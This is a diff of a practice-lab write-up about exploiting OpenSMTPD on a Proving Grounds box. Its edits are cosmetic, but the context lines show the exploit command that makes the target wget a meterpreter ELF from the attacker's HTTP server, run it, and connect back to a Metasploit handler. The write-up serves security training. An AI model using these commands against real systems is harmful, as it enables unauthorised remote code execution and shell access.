@@ -5,8 +5,6 @@ author: H4
 
 This is an Offensive Security proving grounds practice box.
 
----
-
 # enumeration
 
 Starting with a `nmap` scan to identify the attack surface of the target.
@@ -33,7 +31,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
 
 # exploitation
 
-`OpenSMTPD` looks like it is worth a look.
+`OpenSMTPD` looks like it is worth an investigation.
 
 ## search for an exploit
 ```bash
@@ -87,7 +85,7 @@ $ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-### download meterpreter to target
+### download `meterpreter` to target
 ```bash
 $ python3 47984.py 192.168.228.71 25 'wget 192.168.49.228/shell.elf -O /tmp/shell'
 [*] OpenSMTPD detected
@@ -154,6 +152,7 @@ $ python3 47984.py 192.168.228.71 25 '/tmp/shell'
 [*] Done
 ```
 
+### catch the connection from the target
 ```bash
 $ msf6 exploit(multi/handler) > run
 
